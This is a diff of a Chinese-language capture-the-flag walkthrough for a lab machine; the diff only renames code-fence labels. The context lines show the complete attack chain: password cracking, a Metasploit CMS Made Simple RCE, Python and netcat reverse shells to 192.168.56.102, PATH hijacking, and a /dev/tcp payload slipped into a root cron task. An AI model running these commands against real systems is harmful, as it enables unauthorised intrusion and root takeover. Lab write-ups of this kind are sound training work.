@@ -55,7 +55,7 @@ PORT   STATE SERVICE VERSION
 
 尝试破解密码
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $cat hash.txt
 admin:4f943036486b9ad48890b2efbf7735a8$1a0112229fbd699d
@@ -70,7 +70,7 @@ homeandaway      (admin)
 
 利用 metasploit 进行自动化打击
 
-```shell
+```bash
 [msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> show options
 
 Module options (exploit/multi/http/cmsms_object_injection_rce):
@@ -87,7 +87,7 @@ Module options (exploit/multi/http/cmsms_object_injection_rce):
    VHOST                       no        HTTP server virtual host
 ```
 
-```shell
+```bash
 [msf](Jobs:0 Agents:0) exploit(multi/http/cmsms_object_injection_rce) >> exploit
 
 [*] Started reverse TCP handler on 192.168.56.102:4444
@@ -103,7 +103,7 @@ Channel 0 created.
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs -lp 9999
 [16:27:01] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
@@ -199,7 +199,7 @@ MariaDB [cmsms_db]> show tables;
 
 在探测用户目录的时候，发现以下文件
 
-```shell title="/home/matthieu/StaleFinder"
+```bash title="/home/matthieu/StaleFinder"
 #!/usr/bin/env bash
 
 for file in ~/*; do
@@ -217,7 +217,7 @@ done
 
 目测是一种定期执行的脚本，可以尝试通过控制环境变量中的 `bash` 来实现提权
 
-```shell
+```bash
 (remote) www-data@rooSter-Run:/home/matthieu$ echo -e '#!/bin/bash\nnc 192.168.56.102 8888 -e /bin/bash' > /usr/local/bin/bash
 (remote) www-data@rooSter-Run:/home/matthieu$ chmod 777 /usr/local/bin/bash
 ┌─[randark@parrot]─[~/tmp]
@@ -235,7 +235,7 @@ matthieu
 
 ### flag - user
 
-```shell
+```bash
 (remote) matthieu@rooSter-Run:/home/matthieu$ cat user.txt
 32af3c9a9cb2fb748aef29457d8cff55
 ```
@@ -244,7 +244,7 @@ matthieu
 
 对常见目录进行探测
 
-```shell title="/opt/maintenance/backup.sh"
+```bash title="/opt/maintenance/backup.sh"
 #!/bin/bash
 
 PROD="/opt/maintenance/prod-tasks"
@@ -272,7 +272,7 @@ done
 
 首先，先创建一个包含有恶意载荷的脚本
 
-```shell
+```bash
 (remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '#!/bin/bash' > exp.sh
 (remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ echo '/bin/bash -c"/bin/bash -i >& /dev/tcp/192.168.56.102/5555 0>&1"' >> exp.sh
 (remote) matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ cat exp.sh
@@ -283,7 +283,7 @@ done
 
 然后稍等片刻，文件就会被定时任务复制到 `/opt/maintenance/prod-tasks`
 
-```shell
+```bash
 (remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh
 total 20K
 -rwxr-xr-x 1 root root 77 Feb 13 03:23 exp.sh
@@ -291,7 +291,7 @@ total 20K
 
 将文件进行重命名
 
-```shell
+```bash
 (remote) matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ ls -lh
 total 20K
 -rwxr-xr-x 1 root root 77 Feb 13 03:23 exp
@@ -299,7 +299,7 @@ total 20K
 
 重命名后稍等片刻，即可收到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $nc -lvnp 5555
 listening on [any] 5555 ...
@@ -314,7 +314,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@rooSter-Run:~# cat root.txt
 670ff72e9d8099ac39c74c080348ec17
 ```
